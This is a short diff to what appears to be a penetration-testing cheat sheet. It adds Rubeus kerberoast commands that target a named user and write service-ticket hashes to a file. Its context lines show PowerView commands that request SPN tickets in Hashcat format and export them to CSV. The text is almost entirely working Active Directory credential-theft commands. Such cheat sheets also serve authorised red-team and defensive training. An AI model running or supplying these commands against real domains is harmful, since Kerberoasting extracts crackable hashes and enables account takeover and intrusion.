@@ -295,7 +295,13 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -Argumentl
 Request-SPNTicket -SPN "HTTP/MyServiceComputer.TECH.LOCAL" -Format Hashcat
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
 ```
+```
+Rubeus.exe kerberoast /stats
+Rubeus.exe kerberoast /user:analystm2 /nowrap
+Rubeus.exe kerberoast /user:analystm2 /nowrap /simple
+Rubeus.exe kerberoast /user:analystm2 /nowrap /simple /outfile:C:\hashestgt.txt
 
+```
 # POWERSHELL
 ## DOWNLOAD
 ##### POWERSHELL - DOWNLOAD AS STRING
